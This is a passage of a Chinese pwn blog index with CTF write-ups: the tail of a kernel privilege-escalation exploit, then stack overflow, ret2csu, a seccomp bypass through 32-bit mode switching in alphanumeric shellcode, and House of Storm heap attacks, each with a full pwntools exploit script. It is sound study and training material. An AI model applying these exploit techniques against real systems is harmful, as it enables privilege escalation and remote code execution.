 pthread_t thr[2];    unsigned long kernel_addr;    unsigned long kernel_base;    unsigned long kernel_offset;    RegisterUserfault(page, sleep_handle);    write(fd, buf, 0x8);    sleep(2);    // read_handler(buf);    pthread_create(&amp;thr[1], NULL, write_handler, buf);    pthread_create(&amp;thr[0], NULL, control_handler, buf);    // write(fd, page, 0xf0);    read_handler(buf);    // pthread_join(thr[0], NULL);    pthread_join(thr[1], NULL);    canary = *(unsigned long *)(buf + 32 * 8);    kernel_addr = *(unsigned long *)(buf + 47 * 8);    kernel_base = kernel_addr - 0x426939;    kernel_offset = kernel_base - 0xffffffff81000000;    printf(&quot;[+] get canary: %p\\n&quot;, canary);    printf(&quot;[+] get kernel base: %p\\n&quot;, kernel_base);    prepare_kernel_cred = 0xb9550 + kernel_base;    commit_creds = 0xb91e0 + kernel_base;    init_cred = 0x165b400 + kernel_base;    swapgs_pop = swapgs_pop + kernel_offset;    iretq = iretq + kernel_offset;    pop_rdi = pop_rdi + kernel_offset;    // RegisterUserfault(page2, overflow_handle);    pthread_create(&amp;thr[0], NULL, write_handler, buf);    sleep(1);    int i = 0;    *(unsigned long *)(buf + ((i++) * 8)) = canary;    *(unsigned long *)(buf + ((i++) * 8)) = canary;    *(unsigned long *)(buf + ((i++) * 8)) = canary;    *(unsigned long *)(buf + ((i++) * 8)) = canary;    *(unsigned long *)(buf + ((i++) * 8)) = pop_rdi;    *(unsigned long *)(buf + ((i++) * 8)) = init_cred;    *(unsigned long *)(buf + ((i++) * 8)) = commit_creds;    *(unsigned long *)(buf + ((i++) * 8)) = swapgs_pop;    *(unsigned long *)(buf + ((i++) * 8)) = swapgs_pop;    *(unsigned long *)(buf + ((i++) * 8)) = iretq;    *(unsigned long *)(buf + ((i++) * 8)) = get_shell;    *(unsigned long *)(buf + ((i++) * 8)) = user_cs;    *(unsigned long *)(buf + ((i++) * 8)) = user_rflags;    *(unsigned long *)(buf + ((i++) * 8)) = user_sp;    *(unsigned long *)(buf + ((i++) * 8)) = user_ss;    write(fd, buf, 0xe0);    pthread_join(thr[0], NULL);    read(fd, buf, 0x200);    return 0;&#125;\n\n总结这周四道题目难度不算是很大，不过那个easy printf我确实没什么思路，有兴趣的师傅可以去看一下（然后可怜我告诉我一下）。\n","categories":["pwn"],"tags":["Double Fetch","pt_regs","tty_struct","fastbin"]},{"title":"practice Ⅰ","url":"/2022/10/16/practice%E2%85%A0/","content":"练题笔记已经学了一段时间内核了，感觉自己在基础知识方面比较欠缺，所以打算回过头去看一下相关书籍深入学习一下基础知识，在学习途中保持pwn题训练。\neasy stack题目分析题目逻辑很简单\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[128]; // [rsp+0h] [rbp-80h] BYREF  alarm(0x3Cu);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  read_n(s, 0x100LL);  puts(s);  return 0;&#125;\n\nvoid *__fastcall read_n(void *a1, unsigned __int64 a2)&#123;  int v2; // eax  char s[520]; // [rsp+10h] [rbp-210h] BYREF  int v5; // [rsp+218h] [rbp-8h]  int v6; // [rsp+21Ch] [rbp-4h]  v6 = 0;  if ( a2 &gt; 0x200 )  &#123;    puts(&quot;too long!&quot;);    exit(-1);  &#125;  do  &#123;    read(0, &amp;s[v6], 1uLL);    if ( s[v6] == 10 )      break;    if ( !s[v6] )      break;    v2 = v6++;  &#125;  while ( a2 &gt; v2 );  if ( s[v6] == 10 &amp;&amp; a2 &gt; v6 )    s[v6] = 0;  v5 = strlen(s);  return memcpy(a1, s, v5);&#125;\n\n可以看到存在明显的栈溢出漏洞。不过比较棘手的是程序开启了PIE导致我们无法多次利用此漏洞，所以我们目前来看迫切需要的就是重复多次扩大漏洞。\n在栈方面比较熟知扩大漏洞的方法是fini_array劫持，不过这里不存在任意写所以无法实现。\n漏洞分析.text:00000000000007C0                               public _start.text:00000000000007C0                               _start proc near                        ; DATA XREF: LOAD:0000000000000018↑o.text:00000000000007C0                               ; __unwind &#123;.text:00000000000007C0 31 ED                         xor     ebp, ebp.text:00000000000007C2 49 89 D1                      mov     r9, rdx                         ; rtld_fini.text:00000000000007C5 5E                            pop     rsi                             ; argc.text:00000000000007C6 48 89 E2                      mov     rdx, rsp                        ; ubp_av.text:00000000000007C9 48 83 E4 F0                   and     rsp, 0FFFFFFFFFFFFFFF0h.text:00000000000007CD 50                            push    rax.text:00000000000007CE 54                            push    rsp                             ; stack_end.text:00000000000007CF 4C 8D 05 FA 02 00 00          lea     r8, __libc_csu_fini             ; fini.text:00000000000007D6 48 8D 0D 83 02 00 00          lea     rcx, __libc_csu_init            ; init.text:00000000000007DD 48 8D 3D E0 01 00 00          lea     rdi, main                       ; main.text:00000000000007E4 FF 15 F6 07 20 00             call    cs:__libc_start_main_ptr.text:00000000000007E4.text:00000000000007EA F4                            hlt.text:00000000000007EA                               ; &#125; // starts at 7C0.text:00000000000007EA.text:00000000000007EA                               _start endp\n\n总所周知，程序的入口是_start函数，并且我们知道这里的执行顺序是__libc_csu_init=&gt;main=&gt;__libc_csu_fini\n\n可以看到在进入函数不过多久就开始调用了_libc_csu_init，并且把main地址放在了rsp+0x18位置\n.text:0000000000021A35                 lea     rdi, [rsp+0B8h+var_98] ; env.text:0000000000021A3A                 call    _setjmp.text:0000000000021A3F                 test    eax, eax.text:0000000000021A41                 jnz     short loc_21A8E.text:0000000000021A43                 mov     rax, fs:300h.text:0000000000021A4C                 mov     [rsp+0B8h+var_50], rax.text:0000000000021A51                 mov     rax, fs:2F8h.text:0000000000021A5A                 mov     [rsp+0B8h+var_48], rax.text:0000000000021A5F                 lea     rax, [rsp+0B8h+var_98].text:0000000000021A64                 mov     fs:300h, rax.text:0000000000021A6D                 mov     rax, cs:environ_ptr.text:0000000000021A74                 mov     rsi, [rsp+8].text:0000000000021A79                 mov     edi, [rsp+14h].text:0000000000021A7D                 mov     rdx, [rax].text:0000000000021A80                 mov     rax, [rsp+18h].text:0000000000021A85                 call    rax\n\n\n随后调用main函数，然后从main函数返回时的ret地址自然而然成了call的下一行。所以如果我们可以覆盖末尾字节为0x80即可重新进入main函数达到扩大漏洞的效果。\n综上，expfrom pwn import *elf = ELF(&#x27;./easy_stack&#x27;)# r = process(&#x27;./easy_stack&#x27;)r = remote(&#x27;nc.eonew.cn&#x27;, 10004)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;payload = b&#x27;a&#x27;*0x88+p16(0x80)r.send(payload)r.recvuntil(b&#x27;a&#x27;*0x88)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x21A80print(hex(libc_base))payload = b&#x27;a&#x27;*0x88 + flat(libc_base+0x415a6)r.sendline(payload)r.interactive()\n\nno leak题目分析这里吐槽一下这个平台，给的libc不是常见libc，并且也不给ld文件，上面一道可以泄漏还好这个无法泄漏只能爆破偏移，太浪费时间了，基本就是盲调。\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  alarm(0x3Cu);  read(0, buf, 0x100uLL);  return 0;&#125;\n\n题目很简单，就只有简单的栈溢出，并且不存在任何的输出函数。\n\n这里还有一个吐槽点，因为程序保护是Full RELRO所以走ret2resolve是行不通的，所以下意识就是去找gadget。这里的吐槽点就是在ida和ROPgadget里面都找到有用的gadget是在ropper导出的内容才找到：\n0000000000400518: add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret\n\n这里依旧需要熟知程序的运行机制，在上面一道题中我们提到了，程序开始时_start=&gt;__libc_start_main=&gt;main，在最后这里进入main时是用call进入的，所以会在栈上残留下__libc_start_main+231的地址，不过这里因为我们要持续劫持执行流所以我们不能利用这里，不过这里依旧存在很多可以用的，这里就不再赘述，可以自己看一下__libc_start_main的函数代码。\n利用分析看得出来上面的gadget是可以修改任意地址上内容的值，所以如果我们在已知地址上放上libc地址即可根据偏移得到system的地址，最后通过csu来call已知位置即可。\n最后得出的思路就是：\n栈迁移到bss段=&gt;在bss布置rop进行csu调用__libc_start_main=&gt;在__libc_start_main中调用read覆盖栈=&gt;使用gadget修改残留位置指向system并用csu调用\n综上，expfrom pwn import *elf = ELF(&#x27;./no_leak&#x27;)# r = process(&#x27;./no_leak&#x27;)r = remote(&#x27;nc.eonew.cn&#x27;, 10002)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]bss = elf.bss()+0x500main = elf.sym[&#x27;main&#x27;]_start = 0x400474pop_rdi = 0x00000000004005d3pop_rsi_r15 = 0x00000000004005d1# add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; retgadget = 0x0000000000400518pop_rbp = 0x00000000004004b8pop_rbx_rbp_r12_r13_r14_r15 = 0x4005CAone_gadget = 0x41720# gdb.attach(r, &#x27;b*&#x27;+hex(elf.plt[&#x27;read&#x27;]))payload = b&#x27;a&#x27;*0x80+flat(bss, pop_rdi, 0, pop_rsi_r15,                         bss, 0, elf.plt[&#x27;read&#x27;], 0x400564)r.sendline(payload)payload = flat(0x196082, 0x4005CA, (one_gadget-0x21a87)-1, (one_gadget-0x21a87),               (0x601558 - (((one_gadget-0x21a87)-1)*8)), elf.symbols[&#x27;read&#x27;], 0, 0x601488, 0x4005B0, _start)sleep(1)r.sendline(payload)sleep(1)bin_sh_addr = 0x601488+0x90+8payload = flat(pop_rbx_rbp_r12_r13_r14_r15,               -0x371f08, [0]*5, pop_rbp, 0x601448+0x3d, gadget, 0x4005CA, 0, 1, 0x601448, bin_sh_addr, 0, 0, 0x0000000000400416, 0x4005B0)payload += b&#x27;/bin/sh\\x00&#x27;r.sendline(payload)# r.sendline(p64(main))r.interactive()\n\nshellcode在以往遇到沙箱的问题都是使用ORW，并且只是常规的进行调用，并没有更加深层次的讨论。这里就借此题目更加深入讨论一下在CTF中常见的沙箱保护以及绕过方式。\n题目分析void __noreturn start()&#123;  signed __int64 v0; // rax  signed __int64 v1; // rax  signed __int64 v2; // rax  unsigned __int64 v3; // r10  signed __int64 v4; // rax  char *v5; // rbx  signed __int64 v6; // rax  signed __int64 v7; // rax  int v8; // r12d  int i; // r13d  signed __int64 v10; // rax  signed __int64 v11; // rax  unsigned __int64 arg3[2]; // [rsp+80h] [rbp-80h] BYREF  __int16 v13; // [rsp+90h] [rbp-70h] BYREF  char v14; // [rsp+92h] [rbp-6Eh]  char v15; // [rsp+93h] [rbp-6Dh]  int v16; // [rsp+94h] [rbp-6Ch]  __int16 v17; // [rsp+98h] [rbp-68h]  char v18; // [rsp+9Ah] [rbp-66h]  char v19; // [rsp+9Bh] [rbp-65h]  int v20; // [rsp+9Ch] [rbp-64h]  __int16 v21; // [rsp+A0h] [rbp-60h]  char v22; // [rsp+A2h] [rbp-5Eh]  char v23; // [rsp+A3h] [rbp-5Dh]  int v24; // [rsp+A4h] [rbp-5Ch]  __int16 v25; // [rsp+A8h] [rbp-58h]  char v26; // [rsp+AAh] [rbp-56h]  char v27; // [rsp+ABh] [rbp-55h]  int v28; // [rsp+ACh] [rbp-54h]  __int16 v29; // [rsp+B0h] [rbp-50h]  char v30; // [rsp+B2h] [rbp-4Eh]  char v31; // [rsp+B3h] [rbp-4Dh]  int v32; // [rsp+B4h] [rbp-4Ch]  __int16 v33; // [rsp+B8h] [rbp-48h]  char v34; // [rsp+BAh] [rbp-46h]  char v35; // [rsp+BBh] [rbp-45h]  int v36; // [rsp+BCh] [rbp-44h]  __int16 v37; // [rsp+C0h] [rbp-40h]  char v38; // [rsp+C2h] [rbp-3Eh]  char v39; // [rsp+C3h] [rbp-3Dh]  int v40; // [rsp+C4h] [rbp-3Ch]  __int16 v41; // [rsp+C8h] [rbp-38h]  char v42; // [rsp+CAh] [rbp-36h]  char v43; // [rsp+CBh] [rbp-35h]  int v44; // [rsp+CCh] [rbp-34h]  __int16 v45; // [rsp+D0h] [rbp-30h]  char v46; // [rsp+D2h] [rbp-2Eh]  char v47; // [rsp+D3h] [rbp-2Dh]  int v48; // [rsp+D4h] [rbp-2Ch]  v13 = 32;  v14 = 0;  v15 = 0;  v16 = 0;  v17 = 21;  v18 = 6;  v19 = 0;  v20 = 5;  v21 = 21;  v22 = 5;  v23 = 0;  v24 = 37;  v25 = 21;  v26 = 4;  v27 = 0;  v28 = 1;  v29 = 21;  v30 = 3;  v31 = 0;  v32 = 0;  v33 = 21;  v34 = 2;  v35 = 0;  v36 = 9;  v37 = 21;  v38 = 1;  v39 = 0;  v40 = 231;  v41 = 6;  v42 = 0;  v43 = 0;  v44 = 0;  v45 = 6;  v46 = 0;  v47 = 0;  v48 = 2147418112;  LOWORD(arg3[0]) = 9;  arg3[1] = (unsigned __int64)&amp;v13;  v0 = sys_alarm(0x3Cu);  v1 = sys_write(1u, &quot;---------- Shellcode ----------\\n&quot;, 0x20uLL);  v2 = sys_prctl(38, 1uLL, 0LL, 0LL);  v4 = sys_prctl(22, 2uLL, (unsigned __int64)arg3, v3);  v5 = (char *)sys_mmap(0LL, 0x1000uLL, 7uLL, 0x22uLL, 0xFFFFFFFFuLL, 0LL);  v6 = sys_write(1u, &quot;Input your shellcode: &quot;, 0x16uLL);  v7 = sys_read(0, v5, 0x1000uLL);  v8 = v7;  if ( v5[(int)v7 - 1] == 10 )  &#123;    v5[(int)v7 - 1] = 0;    v8 = v7 - 1;  &#125;  for ( i = 0; i &lt; v8; ++i )  &#123;    if ( v5[i] &lt;= 0x1F || v5[i] == 0x7F )    &#123;      v10 = sys_write(1u, &quot;Check!\\n&quot;, 7uLL);      goto LABEL_10;    &#125;  &#125;  ((void (*)(void))v5)();LABEL_10:  v11 = sys_exit_group(0);&#125;\n\n题目很简单，限制了输入的shellcode为可见字符，这里虽然ida翻译为了if ( v5[i] &lt;= 0x1F || v5[i] == 0x7F )不过在实际调试过程中发现就是不允许大于0x7f，上面开启了sandbox。\nroot@0df3326fd7c0:/ctf/work/download # seccomp-tools dump ./shellcode---------- Shellcode ---------- line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000000  A = sys_number 0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008 0003: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0008 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008 0007: 0x06 0x00 0x00 0x00000000  return KILL 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOWroot@0df3326fd7c0:/ctf/work/download #\n\n如果按照我以往的思维方式会认为这道题目是没法完成的，应为没有open调用。所以下面就讲解一下sandbox的一些利用技巧。\nsandbox绕过这里拿一个平时十分常见的沙箱规则做讲解：\n0000: 0x20 0x00 0x00 0x00000004  A = arch0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 00080002: 0x20 0x00 0x00 0x00000000  A = sys_number0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 00050004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 00080005: 0x15 0x02 0x00 0x00000003  if (A == close) goto 00080006: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 00080007: 0x06 0x00 0x00 0x7fff0000  return ALLOW0008: 0x06 0x00 0x00 0x00000000  return KILL\n\n这个沙箱规则是非常简单的，可以看到可以直接进行ORW获得flag。\n可以看到这里前面两行做了一个判断，这个判断的效果就是判断当前的架构是否为amd64，如果不是可以看到直接会被kill掉。接着下面两行是验证sys_number的需要小于0x40000000。\n下面主要讲解如果不存上述两条判断的情况，以及一种额外的绕过方式。\n0000: 0x20 0x00 0x00 0x00000000  A = sys_number0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 00080002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 00080003: 0x15 0x04 0x00 0x00000001  if (A == write) goto 00080004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 00080005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 00080006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 00080007: 0x06 0x00 0x00 0x00000000  return KILL0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n\n这里用题目的沙箱规则做讲解。可以看到这里不存在架构的判断，并且也不存在sys_number大小的判断。不过可以看出来这里不能使用sysnumber+0x40000000的方式来绕过，因为这里判断调用号都不满足时就会直接KILL掉。不过这里可以使用进入x86架构来绕过。\n首先要知道，程序是怎么知道要以64位模式运行还是以32位模式运行的；寄存器中有一个cs寄存器，cs = 0x23代表32位模式，cs = 0x33代表64位模式，而cs寄存器就是通过上面提到的retfq汇编指令来修改。\n然后再深扒一下retfq指令，这一指令其实存在的是两步，分别是:ret; mov cs, [rsp + 8]所以如果我们事先控制了栈上的内容即可实现切换架构。\n再看一下没有sys_number检验的沙箱规则\n0000: 0x20 0x00 0x00 0x00000004  A = arch0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 00090002: 0x20 0x00 0x00 0x00000000  A = sys_number0003: 0x15 0x05 0x00 0x00000002  if (A == open) goto 00090004: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 00090005: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 00090006: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 00090007: 0x15 0x01 0x00 0x00000130  if (A == open_by_handle_at) goto 00090008: 0x06 0x00 0x00 0x7fff0000  return ALLOW0009: 0x06 0x00 0x00 0x00000000  return KILL\n\n这里是随便找的一个例子，可能不是很严谨。可以看到这里验证了架构，但是没有验证sys_number所以使用sys_number|0x40000000在下面的判断中不会被KILL掉，并且在后续执行过程中只会使用只会调用sys_number\n下面讲解一下如果上述两条都存在时我们需要调用ORW应该如何处理\n0000: 0x20 0x00 0x00 0x00000004  A = arch0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 00110002: 0x20 0x00 0x00 0x00000000  A = sys_number0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 00050004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 00110005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 00110006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 00110007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 00110008: 0x15 0x02 0x00 0x00000003  if (A == close) goto 00110009: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 00110010: 0x06 0x00 0x00 0x7fff0000  return ALLOW0011: 0x06 0x00 0x00 0x00000000  return KILL\n\nopen系统调用实际上是调用了openat，所以直接 调用openat，然后除了 read，write，其实还有两个readv，和writev，这些就能绕过限制读取flag\n解题思路有了上述的基础就好做了，首先我们的思路就是想办法转到32位结构执行open，因为在32位的系统调用中open是5所以可以通过过滤。\n不过这里我们需要知道的是在64位架构下的栈地址，在32位架构下是无法解析的，所以我还需要利用mmap生成一个可以放进esp中的地址当作栈。\n其实有了上面的基础就很简单了，就不再赘述了直接给exp了。\n综上，expfrom pwn import *elf = ELF(&#x27;./shellcode&#x27;)# r = process(&quot;./shellcode&quot;)r = remote(&#x27;nc.eonew.cn&#x27;, 10011)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]shellcode = &#x27;&#x27;&#x27;/*mmap(0x40404040,0x7e,7,34,0,0)*/push 0x40404040pop rdipush 0x7epop rsipush 0x40pop raxxor al,0x47push raxpop rdxpush 0x40pop raxxor al,0x40push raxpop r8push raxpop r9push rbxpop raxpush 0x5dpop rcxxor byte ptr[rax+0x2e],clpush 0x5fpop rcxxor byte ptr[rax+0x2f],clpush 0x40pop raxxor al,0x49push rdxpop rdx/*read(0,0x40404040,0x70)*/push 0x40404040pop rsipush 0x40pop raxxor al,0x40push raxpop rdixor al,0x40push 0x70pop rdxpush rbxpop raxpush 0x5dpop rcxxor byte ptr[rax+0x54],clpush 0x5fpop rcxxor byte ptr[rax+0x55],clpush rdxpop raxxor al,0x70push rdxpop rdx/*change to x86*/push rbxpop raxxor al,0x40push 0x72pop rcxxor byte ptr[rax+0x3d],clpush 0x68pop rcxxor byte ptr[rax+0x3d],clpush 0x47pop rcxsub byte ptr[rax+0x3e],clpush 0x48pop rcxsub byte ptr[rax+0x3e],clpush rdipush rdipush 0x23push 0x40404040pop raxpush raxpush rdxpop rdx&#x27;&#x27;&#x27;# gdb.attach(r, &#x27;b*0x4002DE\\nb*0x4002EB\\nc&#x27;)payload = asm(shellcode, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)r.sendline(payload)# context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)shellcode = &#x27;&#x27;&#x27;/*open(&quot;flag&quot;)*/mov esp,0x40404140push 0x67616c66push esppop ebxxor ecx,ecxmov eax,5int 0x80mov ecx,eax&#x27;&#x27;&#x27;payload = asm(shellcode)# context.update(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)payload += b&#x27;\\x90&#x27;*0x29payload += asm(&#x27;&#x27;&#x27;/*change to x64*/push 0x33push 0x40404089retfq/*read(fp,buf,0x70)*/mov rdi,rcxmov rsi,rspmov rdx,0x70xor rax,raxsyscall/*write(1,buf,0x70)*/mov rdi,1mov rax,1syscall&#x27;&#x27;&#x27;, arch=&#x27;amd64&#x27;)r.sendline(payload)r.interactive()\n\nHouse of Storm题目分析这道题目是十分常规的菜单类堆题，不过这里在main中做了一定处理。\nunsigned __int64 __fastcall new_environment(int a1)&#123;  int v1; // edx  int v2; // ecx  int v3; // er8  int v4; // er9  unsigned __int64 buf; // [rsp+10h] [rbp-10h]  unsigned __int64 v7; // [rsp+18h] [rbp-8h]  v7 = __readfsqword(0x28u);  old_addr = &amp;dword_0;  read(a1, &amp;buf, 8uLL);  buf = buf &gt;&gt; 32 &lt;&lt; 12;  mallopt(1, 0);  change_addr(buf, 0, v1, v2, v3, v4);  munmap(old_addr, 0x2000uLL);  munmap((char *)old_addr + 2101248, 0x2000uLL);  old_addr = 0LL;  return __readfsqword(0x28u) ^ v7;&#125;\n\nunsigned __int64 __fastcall change_addr(__int64 a1)&#123;  unsigned __int64 v1; // ST28_8  __int64 v2; // ST18_8  char *retaddr; // [rsp+38h] [rbp+8h]  v1 = __readfsqword(0x28u);  v2 = a1 - (_QWORD)old_addr;  mmap((void *)a1, 0x2000uLL, 2, 34, -1, 0LL);  memcpy((void *)a1, old_addr, 0x2000uLL);  mprotect((void *)a1, 0x2000uLL, 5);  mmap((void *)(a1 + 2101248), 0x1000uLL, 2, 34, -1, 0LL);  memcpy((void *)(a1 + 2101248), (char *)old_addr + 2101248, 0x1000uLL);  mprotect((void *)(a1 + 2101248), 0x1000uLL, 1);  mmap((void *)(a1 + 2105344), 0x1000uLL, 2, 34, -1, 0LL);  memcpy((void *)(a1 + 2105344), (char *)&amp;_data_start + (_QWORD)old_addr, 0x1000uLL);  mprotect((void *)(a1 + 2105344), 0x1000uLL, 3);  retaddr += v2;  return __readfsqword(0x28u) ^ v1;&#125;\n\n具体调试后得知这里会将process原本的基地址的内容转移到新的mmap出来的地址上去。不知道为什么如果这样干了gdb就会出现报错无法调试。不过这里只是修改process地址对我们利用没什么影响所以本地调试时可以直接patch掉。\nint delete()&#123;  signed int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;Which one do you want to delete?&quot;);  v1 = get_int(&quot;Which one do you want to delete?&quot;);  if ( v1 &lt; 0 || (unsigned int)v1 &gt; 0xF || !ptr[v1] )    return puts(&quot;Error: Invalid index!\\n&quot;);  free(ptr[v1]);  return puts(&quot;Success!\\n&quot;);&#125;\n\n这里就是这道题目的漏洞点，很明显的UAF。忘了提一下，这里因为mallopt的缘故无法利用fastbin，虽然我们patch掉，但是如果用fastbin远程就打不通了。\n漏洞利用题目给的glibc版本时2.23所以我的第一反应就是通过large bin attack劫持IO_FILE的vtable然后直接执行one_gadget。\n不过实际操作会发现所有的one_gadget都不符合条件，所以我们只能另辟蹊径。\n这里我想到的是通过setcontext进行栈迁移，最后rop拿到shell。不过在puts中调用vtable时使用的寄存器为rax，这里需要有堆地址的寄存器位rdi，所以找到了一个magic gadget：\n0000000000065bca: mov rdi, rax; call qword ptr [rax + 0x20];\n\n综上，expfrom pwn import *elf = ELF(&#x27;./house_of_storm&#x27;)# r = process(&#x27;./house_of_storm&#x27;)r = remote(&#x27;nc.eonew.cn&#x27;, 10001)libc = ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.os = &#x27;linux&#x27;def create(size):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;What size do you want?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))def delete(idx):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which one do you want to delete?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, data):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which one do you want to modify?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;What do you want to input?&#x27;)    r.send(data)def show(idx):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Which one do you want to see?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))create(0x510)create(0x100)create(0x500)create(0x100)create(0x200)create(0x100)create(0x200)create(0x100)delete(4)delete(6)show(6)r.recvline()heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0xc50print(hex(heap_base))delete(7)delete(5)delete(0)show(0)r.recvline()libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x39bb78print(hex(libc_base))pop_rdi = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))system = libc_base+libc.sym[&#x27;system&#x27;]bin_sh = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))edit(1, flat(pop_rdi, bin_sh, system))create(0x600)# gdb.attach(r)edit(0, flat([libc_base+0x39bfa8]*2, 0, libc_base +     0x39c6f8-0x20, 0, libc_base+0x734f0)+b&#x27;\\n&#x27;)delete(2)# gdb.attach(r, &#x27;b*$rebase(0xC17)\\nb*&#x27;+hex(libc_base+0x45226))# gdb.attach(r, &#x27;b*$rebase(0xE10)&#x27;)edit(2, flat([libc_base+0x39bb78]*2,     [libc_base + 0x45226]*3, libc_base+0x734f0)+b&#x27;\\n&#x27;)create(0x600)# gdb.attach(r, &#x27;b*$rebase(0xE10)\\nc&#x27;)# edit(2, flat([libc_base+0x3c4b78]*2, [libc_base +#      libc.symbols[&#x27;setcontext&#x27;]+53]*3, libc_base+0x6d99a))sleep(1)r.sendline(b&#x27;3&#x27;)sleep(1)r.sendline(bytes(str(0), encoding=&#x27;utf8&#x27;))sleep(1)payload = flat([libc_base + libc.symbols[&#x27;setcontext&#x27;]+53]               * 5, libc_base+0x65bca)payload = payload.ljust(0xa0-0x10, b&#x27;a&#x27;) + \\    flat(heap_base+0x520, libc_base+0x205c2)r.send(payload)# edit(0, flat([libc_base+0x45226]*5, libc_base+0x7c990))r.interactive()\n\n小结这么多天做星盟的题会发现题目质量非常之高，需要对程序的运行，sandbox绕过机制，shellcode的熟练编写以及在堆题中找适合的gadget，有深刻的理解才可以完成解题。\n","tags":["sandbox","shellcode","__libc_start_main","house of storm"]},{"title":"pwn-100","url":"/2021/09/20/pwn-100/","content":"获取程序信息\n是六十四位程序，小端序，没有开起栈溢出保护\n反编译分析程序程序源码:\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  sub_40068E();  return 0LL;&#125;\n\nint sub_40068E()&#123;  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;v1, 200);  return puts(&quot;bye~&quot;);&#125;\n\n__int64 __fastcall sub_40063D(__int64 a1, signed int a2)&#123;  __int64 result; // rax  unsigned int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  &#123;    result = i;    if ( (signed int)i &gt;= a2 )      break;    read(0, (void *)((signed int)i + a1), 1uLL);  &#125;  return result;&#125;\n\n在ida pro里面没找到system函数，也没找到”/bin/sh”字符串。所以就该开始构造ROP\n64位的程序在进行ROP与32不一样，64位的参数放在寄存器(我好像上一篇提到过)，使用ROPgadegt\n\n找到符合要求的汇编指令，后续就直接开始pwn它\ngetshellexp脚本\nfrom pwn import *from LibcSearcher import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/bee9f73f50d2487e911da791273ae5a3&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 53172)plt_puts_addr = elf.plt[&#x27;puts&#x27;]got_puts_addr = elf.got[&#x27;puts&#x27;]pop_rdi_ret_addr = 0x0000000000400763main_addr = 0x4006b8payload = b&#x27;a&#x27; * (0x40 + 0x08) + p64(pop_rdi_ret_addr) + \\    p64(got_puts_addr) + p64(plt_puts_addr) + p64(main_addr)payload = payload.ljust(200, 